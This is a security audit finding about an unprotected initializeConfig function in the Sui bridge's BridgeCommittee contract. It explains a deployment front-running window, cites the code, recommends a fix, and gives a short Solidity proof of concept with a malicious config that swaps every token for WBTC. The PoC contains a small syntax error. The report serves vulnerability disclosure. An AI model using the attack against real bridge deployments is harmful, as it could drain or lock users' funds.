### Title
Unprotected `initializeConfig` in `BridgeCommittee` Allows Anyone to Inject a Malicious Config Before Deployment Completes — (`bridge/evm/contracts/BridgeCommittee.sol`)

---

### Summary

`BridgeCommittee.initializeConfig()` has no access control. The deployment script deploys `BridgeCommittee` in one transaction, then `BridgeConfig` in a second, then calls `initializeConfig` in a third. Any attacker who monitors the mempool can front-run that third transaction and permanently bind the committee to an attacker-controlled `IBridgeConfig` implementation. Because `SuiBridge` reads `committee.config()` for every token transfer — to resolve token addresses, chain IDs, and decimal conversions — a malicious config corrupts all subsequent bridge operations, enabling illegitimate token unlocks or a permanent fund lock.

---

### Finding Description

`BridgeCommittee.initializeConfig` is declared `external` with no `onlyOwner`, no `initializer` modifier, and no role check:

```solidity
function initializeConfig(address _config) external {
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
``` [1](#0-0) 

The sole guard is a one-time "not yet set" check. The deployment script issues these as **separate on-chain transactions**:

1. `Upgrades.deployUUPSProxy("BridgeCommittee.sol", abi.encodeCall(BridgeCommittee.initialize, ...))` — sets committee members and stakes; `config` is `address(0)`.
2. `Upgrades.deployUUPSProxy("BridgeConfig.sol", ...)` — deploys the legitimate config.
3. `BridgeCommittee(bridgeCommittee).initializeConfig(address(bridgeConfig))` — **the unprotected call**. [2](#0-1) 

Between transactions 1 and 3, `config == address(0)`, so any caller can invoke `initializeConfig` with an arbitrary address and permanently win the race. Once set, the check `require(address(config) == address(0))` prevents any further change through normal means.

The `config` slot is consumed by every critical bridge path in `SuiBridge`:

```solidity
IBridgeConfig config = committee.config();
require(tokenTransferPayload.targetChain == config.chainID(), ...);
uint256 erc20AdjustedAmount = BridgeUtils.convertSuiToERC20Decimal(
    IERC20Metadata(config.tokenAddressOf(tokenTransferPayload.tokenID)).decimals(),
    config.tokenSuiDecimalOf(tokenTransferPayload.tokenID),
    tokenTransferPayload.amount
);
_transferTokensFromVault(..., tokenTransferPayload.recipientAddress, erc20AdjustedAmount);
``` [3](#0-2) 

The same `committee.config()` call governs `bridgeERC20` (deposit path), which resolves the token address for user deposits: [4](#0-3) 

---

### Impact Explanation

**Scenario A — Token substitution (Critical):** The attacker deploys a malicious `IBridgeConfig` that returns the correct `chainID()` (so the chain-ID check passes) but maps token IDs to wrong ERC-20 addresses — e.g., maps USDC's token ID to the WBTC contract address. When legitimate committee members sign a valid Sui→Ethereum USDC transfer message, `_transferTokensFromVault` releases WBTC to the recipient instead of USDC. An attacker who is the recipient of such a transfer receives a more valuable token than deposited, draining the vault. This matches the Critical impact gate: *bridge governance bypass enabling illegitimate unlock*.

**Scenario B — Permanent fund lock (High):** The attacker deploys a malicious config whose `chainID()` returns a value that never matches any legitimate message's `targetChain`. Every call to `transferBridgedTokensWithSignatures` reverts at the chain-ID check, permanently locking all assets in the vault. The committee can recover only by upgrading `BridgeCommittee` via `upgradeWithSignatures`, which requires a quorum — a costly, time-consuming remediation.

---

### Likelihood Explanation

The deployment script broadcasts multiple transactions from a single EOA. Each transaction is individually visible in the mempool. A bot watching for `BridgeCommittee` proxy deployments can detect the `initialize` call, compute the proxy address, and submit `initializeConfig(maliciousConfig)` with a higher gas price before the deployer's own `initializeConfig` lands. This is a standard front-running pattern with no special privileges required — only an ordinary Ethereum account and mempool access.

---

### Recommendation

Restrict `initializeConfig` to the deployer. The simplest fix is to record `msg.sender` during `initialize` and gate `initializeConfig` on that address:

```solidity
address private _deployer;

function initialize(...) external initializer {
    _deployer = msg.sender;
    // existing logic
}

function initializeConfig(address _config) external {
    require(msg.sender == _deployer, "BridgeCommittee: Unauthorized");
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
```

Alternatively, collapse the two-step initialization into a single atomic call by passing `_config` directly to `initialize`, eliminating the window entirely. This mirrors the RocketPool fix: restrict the unprotected setter to a trusted account until bootstrapping is complete.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 1. Deployer broadcasts: BridgeCommittee proxy deployed + initialize() called.
//    At this point: committee.config() == address(0)

// 2. Attacker sees the tx in the mempool, deploys a malicious config:
contract MaliciousConfig is IBridgeConfig {
    uint8 public chainID() external pure override returns (uint8) { return 12; } // matches real chain
    function tokenAddressOf(uint8) external pure override returns (address) {
        return WBTC_ADDRESS; // always return WBTC regardless of tokenID
    }
    function tokenSuiDecimalOf(uint8) external pure override returns (uint8) { return 8; }
    function isTokenSupported(uint8) external pure override returns (bool) { return true; }
    function isChainSupported(uint8) external pure override returns (bool) { return true; }
    // ... other stubs
}

// 3. Attacker front-runs the deployer's initializeConfig call:
BridgeCommittee(committeeProxy).initializeConfig(address(new MaliciousConfig()));
// Succeeds because config == address(0)

// 4. Deployer's own initializeConfig call now reverts:
// "BridgeCommittee: Config already initialized"

// 5. All subsequent transferBridgedTokensWithSignatures calls use MaliciousConfig,
//    releasing WBTC from the vault for any token transfer message signed by the committee.
```

The deployment window exists between lines 124–135 (committee deploy) and line 175 (`initializeConfig` call) of the deploy script. [5](#0-4)

### Citations

**File:** bridge/evm/contracts/BridgeCommittee.sol (L63-66)
```text
    function initializeConfig(address _config) external {
        require(address(config) == address(0), "BridgeCommittee: Config already initialized");
        config = IBridgeConfig(_config);
    }
```

**File:** bridge/evm/script/deploy_bridge.s.sol (L124-178)
```text
        address bridgeCommittee = Upgrades.deployUUPSProxy(
            "BridgeCommittee.sol",
            abi.encodeCall(
                BridgeCommittee.initialize,
                (
                    deployConfig.committeeMembers,
                    committeeMemberStake,
                    uint16(deployConfig.minCommitteeStakeRequired)
                )
            ),
            opts
        );

        // deploy bridge config =====================================================================

        // convert token prices from uint256 to uint64
        uint64[] memory tokenPrices = new uint64[](deployConfig.tokenPrices.length);
        for (uint256 i; i < deployConfig.tokenPrices.length; i++) {
            tokenPrices[i] = uint64(deployConfig.tokenPrices[i]);
        }

        // convert Sui Decimals from uint256 to uint8
        uint8[] memory suiDecimals = new uint8[](deployConfig.suiDecimals.length);
        for (uint256 i; i < deployConfig.suiDecimals.length; i++) {
            suiDecimals[i] = uint8(deployConfig.suiDecimals[i]);
        }

        // convert Token Id from uint256 to uint8
        uint8[] memory tokenIds = new uint8[](deployConfig.tokenIds.length);
        for (uint256 i; i < deployConfig.tokenIds.length; i++) {
            tokenIds[i] = uint8(deployConfig.tokenIds[i]);
        }

        address bridgeConfig = Upgrades.deployUUPSProxy(
            "BridgeConfig.sol",
            abi.encodeCall(
                BridgeConfig.initialize,
                (
                    address(bridgeCommittee),
                    uint8(deployConfig.sourceChainId),
                    deployConfig.supportedTokens,
                    tokenPrices,
                    tokenIds,
                    suiDecimals,
                    supportedChainIds
                )
            ),
            opts
        );

        // initialize config in the bridge committee
        BridgeCommittee(bridgeCommittee).initializeConfig(address(bridgeConfig));
        BridgeCommittee committeeImplementation =
            BridgeCommittee(Upgrades.getImplementationAddress(bridgeCommittee));
        committeeImplementation.initializeConfig(address(bridgeConfig));
```

**File:** bridge/evm/contracts/SuiBridge.sol (L67-89)
```text
        IBridgeConfig config = committee.config();

        BridgeUtils.TokenTransferPayload memory tokenTransferPayload =
            BridgeUtils.decodeTokenTransferPayload(message.payload);

        // verify target chain ID is this chain ID
        require(
            tokenTransferPayload.targetChain == config.chainID(), "SuiBridge: Invalid target chain"
        );

        // convert amount to ERC20 token decimals
        uint256 erc20AdjustedAmount = BridgeUtils.convertSuiToERC20Decimal(
            IERC20Metadata(config.tokenAddressOf(tokenTransferPayload.tokenID)).decimals(),
            config.tokenSuiDecimalOf(tokenTransferPayload.tokenID),
            tokenTransferPayload.amount
        );

        _transferTokensFromVault(
            message.chainID,
            tokenTransferPayload.tokenID,
            tokenTransferPayload.recipientAddress,
            erc20AdjustedAmount
        );
```

**File:** bridge/evm/contracts/SuiBridge.sol (L146-175)
```text
        IBridgeConfig config = committee.config();

        require(config.isTokenSupported(tokenID), "SuiBridge: Unsupported token");

        address tokenAddress = config.tokenAddressOf(tokenID);

        // check that the bridge contract has allowance to transfer the tokens
        require(
            IERC20(tokenAddress).allowance(msg.sender, address(this)) >= amount,
            "SuiBridge: Insufficient allowance"
        );

        // calculate old vault balance
        uint256 oldBalance = IERC20(tokenAddress).balanceOf(address(vault));

        // Transfer the tokens from the contract to the vault
        SafeERC20.safeTransferFrom(IERC20(tokenAddress), msg.sender, address(vault), amount);

        // calculate new vault balance
        uint256 newBalance = IERC20(tokenAddress).balanceOf(address(vault));

        // calculate the amount transferred
        uint256 amountTransfered = newBalance - oldBalance;

        // Adjust the amount
        uint64 suiAdjustedAmount = BridgeUtils.convertERC20ToSuiDecimal(
            IERC20Metadata(tokenAddress).decimals(),
            config.tokenSuiDecimalOf(tokenID),
            amountTransfered
        );
```
